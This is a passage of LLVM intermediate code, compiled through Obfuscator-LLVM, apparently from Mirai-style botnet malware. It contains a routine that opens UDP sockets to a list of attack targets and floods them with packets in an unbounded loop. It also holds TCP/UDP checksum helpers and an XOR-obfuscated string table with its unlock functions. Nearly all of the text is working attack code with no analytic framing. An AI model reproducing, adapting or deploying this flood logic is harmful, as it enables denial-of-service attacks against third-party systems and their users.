  %39 = call zeroext i16 @htons(i16 zeroext %12) #12
  br label %40

; <label>:40:                                     ; preds = %35, %38
  %.sink = phi i16 [ %39, %38 ], [ 0, %35 ]
  %41 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %42, align 2
  %43 = call i32 @socket(i32 2, i32 2, i32 17) #11
  %44 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %43, i32* %44, align 4
  %45 = icmp eq i32 %43, -1
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %40
  ret void

; <label>:47:                                     ; preds = %40
  store i16 2, i16* %28, align 4
  store i16 %.056, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %48 = load i32, i32* %44, align 4
  %49 = call i32 @bind(i32 %48, %struct.sockaddr* nonnull %31, i32 16) #11
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %51 = load i8, i8* %50, align 4
  %52 = icmp ult i8 %51, 32
  br i1 %52, label %53, label %59

; <label>:53:                                     ; preds = %47
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %55 = load i32, i32* %54, align 4
  %56 = call i32 @ntohl(i32 %55) #12
  %57 = call i32 @htonl(i32 %56) #12
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %57, i32* %58, align 4
  br label %59

; <label>:59:                                     ; preds = %53, %47
  %60 = load i32, i32* %44, align 4
  %61 = bitcast %struct.attack_target* %41 to %struct.sockaddr*
  %62 = call i32 @connect(i32 %60, %struct.sockaddr* %61, i32 16) #11
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %63 = icmp slt i64 %indvars.iv.next, %32
  br i1 %63, label %35, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %33, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %64 = and i32 %14, 65535
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %69
  %.158 = phi i32 [ %.mux, %69 ], [ 0, %.lr.ph.preheader ]
  %65 = sext i32 %.158 to i64
  br i1 %34, label %69, label %66

; <label>:66:                                     ; preds = %.lr.ph
  %67 = getelementptr inbounds i8*, i8** %8, i64 %65
  %68 = load i8*, i8** %67, align 8
  call void @rand_str(i8* %68, i32 %64)
  br label %69

; <label>:69:                                     ; preds = %.lr.ph, %66
  %70 = getelementptr inbounds i32, i32* %10, i64 %65
  %71 = load i32, i32* %70, align 4
  %72 = call i64 @send(i32 %71, i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str, i64 0, i64 0), i64 1458, i32 16384) #11
  %73 = add nsw i32 %.158, 1
  %74 = icmp slt i32 %73, %24
  %brmerge = or i1 %74, %33
  %.mux = select i1 %74, i32 %73, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %69
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @checksum_generic(i16* nocapture readonly, i32) local_unnamed_addr #5 {
  %3 = icmp ugt i32 %1, 1
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %.lr.ph.prol, %.lr.ph.prol.preheader
  %.015.prol = phi i64 [ %11, %.lr.ph.prol ], [ 0, %.lr.ph.prol.preheader ]
  %.01114.prol = phi i32 [ %12, %.lr.ph.prol ], [ %1, %.lr.ph.prol.preheader ]
  %.01213.prol = phi i16* [ %8, %.lr.ph.prol ], [ %0, %.lr.ph.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph.prol ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01213.prol, i64 1
  %9 = load i16, i16* %.01213.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.015.prol
  %12 = add i32 %.01114.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !1

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %.lr.ph.prol
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader, %.lr.ph.prol.loopexit.unr-lcssa
  %.015.unr = phi i64 [ 0, %.lr.ph.preheader ], [ %11, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.01114.unr = phi i32 [ %1, %.lr.ph.preheader ], [ %12, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.01213.unr = phi i16* [ %0, %.lr.ph.preheader ], [ %8, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.lcssa.unr = phi i64 [ undef, %.lr.ph.preheader ], [ %11, %.lr.ph.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge.loopexit, label %.lr.ph.preheader.new

.lr.ph.preheader.new:                             ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader.new
  %.015 = phi i64 [ %.015.unr, %.lr.ph.preheader.new ], [ %29, %.lr.ph ]
  %.01114 = phi i32 [ %.01114.unr, %.lr.ph.preheader.new ], [ %30, %.lr.ph ]
  %.01213 = phi i16* [ %.01213.unr, %.lr.ph.preheader.new ], [ %26, %.lr.ph ]
  %14 = getelementptr inbounds i16, i16* %.01213, i64 1
  %15 = load i16, i16* %.01213, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.015
  %18 = getelementptr inbounds i16, i16* %.01213, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01213, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01213, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add i32 %.01114, -8
  %31 = icmp ugt i32 %30, 1
  br i1 %31, label %.lr.ph, label %._crit_edge.loopexit.unr-lcssa

._crit_edge.loopexit.unr-lcssa:                   ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  %.lcssa = phi i64 [ %.lcssa.unr, %.lr.ph.prol.loopexit ], [ %29, %._crit_edge.loopexit.unr-lcssa ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %32 = sub i32 %4, %7
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  %.012.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge.loopexit ]
  %.011.lcssa = phi i32 [ %1, %2 ], [ %32, %._crit_edge.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa, %._crit_edge.loopexit ]
  %33 = icmp eq i32 %.011.lcssa, 1
  br i1 %33, label %34, label %39

; <label>:34:                                     ; preds = %._crit_edge
  %35 = load i16, i16* %.012.lcssa, align 2
  %36 = zext i16 %35 to i64
  %sext = shl i64 %36, 56
  %37 = ashr exact i64 %sext, 56
  %38 = add i64 %37, %.0.lcssa
  br label %39

; <label>:39:                                     ; preds = %34, %._crit_edge
  %.1 = phi i64 [ %38, %34 ], [ %.0.lcssa, %._crit_edge ]
  %40 = lshr i64 %.1, 16
  %41 = and i64 %.1, 65535
  %42 = add nuw nsw i64 %40, %41
  %43 = lshr i64 %42, 16
  %44 = add nuw nsw i64 %43, %42
  %45 = trunc i64 %44 to i16
  %46 = xor i16 %45, -1
  ret i16 %46
}

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr* nocapture readonly, i8* nocapture readonly, i16 zeroext, i32) local_unnamed_addr #8 {
  %5 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %8 = load i32, i32* %7, align 4
  %9 = icmp sgt i32 %3, 1
  br i1 %9, label %.lr.ph33.preheader, label %._crit_edge34

.lr.ph33.preheader:                               ; preds = %4
  %10 = bitcast i8* %1 to i16*
  %11 = add i32 %3, -2
  %12 = lshr i32 %11, 1
  %13 = shl nuw i32 %12, 1
  %14 = zext i32 %13 to i64
  %15 = add nuw nsw i64 %14, 2
  %scevgep = getelementptr i8, i8* %1, i64 %15
  %16 = shl nuw i32 %12, 1
  %17 = add i32 %3, -2
  %18 = lshr i32 %17, 1
  %19 = add nuw i32 %18, 1
  %xtraiter = and i32 %19, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph33.prol.loopexit, label %.lr.ph33.prol.preheader

.lr.ph33.prol.preheader:                          ; preds = %.lr.ph33.preheader
  br label %.lr.ph33.prol

.lr.ph33.prol:                                    ; preds = %.lr.ph33.prol, %.lr.ph33.prol.preheader
  %.031.prol = phi i32 [ %24, %.lr.ph33.prol ], [ %3, %.lr.ph33.prol.preheader ]
  %.02630.prol = phi i32 [ %22, %.lr.ph33.prol ], [ 0, %.lr.ph33.prol.preheader ]
  %.02729.prol = phi i16* [ %23, %.lr.ph33.prol ], [ %10, %.lr.ph33.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph33.prol ], [ %xtraiter, %.lr.ph33.prol.preheader ]
  %20 = load i16, i16* %.02729.prol, align 2
  %21 = zext i16 %20 to i32
  %22 = add i32 %21, %.02630.prol
  %23 = getelementptr inbounds i16, i16* %.02729.prol, i64 1
  %24 = add nsw i32 %.031.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph33.prol.loopexit.unr-lcssa, label %.lr.ph33.prol, !llvm.loop !3

.lr.ph33.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph33.prol
  br label %.lr.ph33.prol.loopexit

.lr.ph33.prol.loopexit:                           ; preds = %.lr.ph33.preheader, %.lr.ph33.prol.loopexit.unr-lcssa
  %.031.unr = phi i32 [ %3, %.lr.ph33.preheader ], [ %24, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.02630.unr = phi i32 [ 0, %.lr.ph33.preheader ], [ %22, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.02729.unr = phi i16* [ %10, %.lr.ph33.preheader ], [ %23, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.lcssa44.unr = phi i32 [ undef, %.lr.ph33.preheader ], [ %22, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %25 = icmp ult i32 %17, 6
  br i1 %25, label %._crit_edge34.loopexit, label %.lr.ph33.preheader.new

.lr.ph33.preheader.new:                           ; preds = %.lr.ph33.prol.loopexit
  br label %.lr.ph33

.lr.ph33:                                         ; preds = %.lr.ph33, %.lr.ph33.preheader.new
  %.031 = phi i32 [ %.031.unr, %.lr.ph33.preheader.new ], [ %42, %.lr.ph33 ]
  %.02630 = phi i32 [ %.02630.unr, %.lr.ph33.preheader.new ], [ %40, %.lr.ph33 ]
  %.02729 = phi i16* [ %.02729.unr, %.lr.ph33.preheader.new ], [ %41, %.lr.ph33 ]
  %26 = load i16, i16* %.02729, align 2
  %27 = zext i16 %26 to i32
  %28 = add i32 %27, %.02630
  %29 = getelementptr inbounds i16, i16* %.02729, i64 1
  %30 = load i16, i16* %29, align 2
  %31 = zext i16 %30 to i32
  %32 = add i32 %31, %28
  %33 = getelementptr inbounds i16, i16* %.02729, i64 2
  %34 = load i16, i16* %33, align 2
  %35 = zext i16 %34 to i32
  %36 = add i32 %35, %32
  %37 = getelementptr inbounds i16, i16* %.02729, i64 3
  %38 = load i16, i16* %37, align 2
  %39 = zext i16 %38 to i32
  %40 = add i32 %39, %36
  %41 = getelementptr inbounds i16, i16* %.02729, i64 4
  %42 = add nsw i32 %.031, -8
  %43 = icmp sgt i32 %42, 1
  br i1 %43, label %.lr.ph33, label %._crit_edge34.loopexit.unr-lcssa

._crit_edge34.loopexit.unr-lcssa:                 ; preds = %.lr.ph33
  br label %._crit_edge34.loopexit

._crit_edge34.loopexit:                           ; preds = %.lr.ph33.prol.loopexit, %._crit_edge34.loopexit.unr-lcssa
  %.lcssa44 = phi i32 [ %.lcssa44.unr, %.lr.ph33.prol.loopexit ], [ %40, %._crit_edge34.loopexit.unr-lcssa ]
  %44 = add i32 %3, -2
  %45 = sub i32 %44, %16
  br label %._crit_edge34

._crit_edge34:                                    ; preds = %._crit_edge34.loopexit, %4
  %46 = phi i8* [ %1, %4 ], [ %scevgep, %._crit_edge34.loopexit ]
  %.026.lcssa = phi i32 [ 0, %4 ], [ %.lcssa44, %._crit_edge34.loopexit ]
  %.0.lcssa = phi i32 [ %3, %4 ], [ %45, %._crit_edge34.loopexit ]
  %47 = icmp eq i32 %.0.lcssa, 1
  br i1 %47, label %48, label %52

; <label>:48:                                     ; preds = %._crit_edge34
  %49 = load i8, i8* %46, align 1
  %50 = zext i8 %49 to i32
  %51 = add i32 %50, %.026.lcssa
  br label %52

; <label>:52:                                     ; preds = %48, %._crit_edge34
  %.1 = phi i32 [ %51, %48 ], [ %.026.lcssa, %._crit_edge34 ]
  %53 = lshr i32 %6, 16
  %54 = and i32 %6, 65535
  %55 = lshr i32 %8, 16
  %56 = and i32 %8, 65535
  %57 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i16
  %60 = tail call zeroext i16 @htons(i16 zeroext %59) #12
  %61 = zext i16 %60 to i32
  %62 = zext i16 %2 to i32
  %63 = add nuw nsw i32 %53, %62
  %64 = add nuw nsw i32 %63, %54
  %65 = add nuw nsw i32 %64, %55
  %66 = add nuw nsw i32 %65, %56
  %67 = add i32 %66, %.1
  %68 = add i32 %67, %61
  %69 = lshr i32 %68, 16
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %52
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %71 = phi i32 [ %74, %.lr.ph ], [ %69, %.lr.ph.preheader ]
  %.228 = phi i32 [ %73, %.lr.ph ], [ %68, %.lr.ph.preheader ]
  %72 = and i32 %.228, 65535
  %73 = add nuw nsw i32 %72, %71
  %74 = lshr i32 %73, 16
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %52
  %.2.lcssa = phi i32 [ %68, %52 ], [ %73, %._crit_edge.loopexit ]
  %76 = trunc i32 %.2.lcssa to i16
  %77 = xor i16 %76, -1
  ret i16 %77
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i32 @rand_next() local_unnamed_addr #9 {
  ret i32 0
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @rand_str(i8* nocapture, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.012 = phi i32 [ %12, %.backedge ], [ %1, %.lr.ph.preheader ]
  %.01011 = phi i8* [ %11, %.backedge ], [ %0, %.lr.ph.preheader ]
  %4 = icmp sgt i32 %.012, 3
  br i1 %4, label %5, label %7

; <label>:5:                                      ; preds = %.lr.ph
  %6 = bitcast i8* %.01011 to i32*
  store i32 0, i32* %6, align 4
  br label %.backedge

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp sgt i32 %.012, 1
  br i1 %8, label %9, label %.backedge.thread

; <label>:9:                                      ; preds = %7
  %10 = bitcast i8* %.01011 to i16*
  store i16 0, i16* %10, align 2
  br label %.backedge

.backedge:                                        ; preds = %9, %5
  %.sink14 = phi i64 [ 2, %9 ], [ 4, %5 ]
  %.sink = phi i32 [ -2, %9 ], [ -4, %5 ]
  %11 = getelementptr inbounds i8, i8* %.01011, i64 %.sink14
  %12 = add i32 %.012, %.sink
  %13 = icmp sgt i32 %12, 0
  br i1 %13, label %.lr.ph, label %._crit_edge.loopexit

.backedge.thread:                                 ; preds = %7
  store i8 0, i8* %.01011, align 1
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.backedge.thread, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_unlock_val(i8 zeroext) local_unnamed_addr #10 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @toggle_obf(i8 zeroext) unnamed_addr #10 {
  %2 = zext i8 %0 to i64
  %3 = load i32, i32* @table_key, align 4
  %4 = lshr i32 %3, 8
  %5 = lshr i32 %3, 16
  %6 = lshr i32 %3, 24
  %7 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %2, i32 1
  %8 = load i16, i16* %7, align 8
  %9 = icmp eq i16 %8, 0
  br i1 %9, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %10 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %2, i32 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = load i8*, i8** %10, align 16
  %13 = getelementptr inbounds i8, i8* %12, i64 %indvars.iv
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = xor i32 %15, %3
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %13, align 1
  %18 = load i8*, i8** %10, align 16
  %19 = getelementptr inbounds i8, i8* %18, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = xor i32 %21, %4
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* %19, align 1
  %24 = load i8*, i8** %10, align 16
  %25 = getelementptr inbounds i8, i8* %24, i64 %indvars.iv
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %5
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* %25, align 1
  %30 = load i8*, i8** %10, align 16
  %31 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = xor i32 %33, %6
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %31, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %36 = load i16, i16* %7, align 8
  %37 = zext i16 %36 to i64
  %38 = icmp slt i64 %indvars.iv.next, %37
  br i1 %38, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #10 {
  %3 = sext i32 %0 to i64
  %4 = icmp eq i32* %1, null
  br i1 %4, label %9, label %5

; <label>:5:                                      ; preds = %2
  %6 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %3, i32 1
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  store i32 %8, i32* %1, align 4
  br label %9

; <label>:9:                                      ; preds = %2, %5
  %10 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %3, i32 0
  %11 = load i8*, i8** %10, align 16
  ret i8* %11
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #11 = { nounwind }
attributes #12 = { nounwind readnone }
attributes #13 = { noreturn nounwind }
attributes #14 = { nounwind readonly }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = distinct !{!1, !2}
!2 = !{!"llvm.loop.unroll.disable"}
!3 = distinct !{!3, !2}
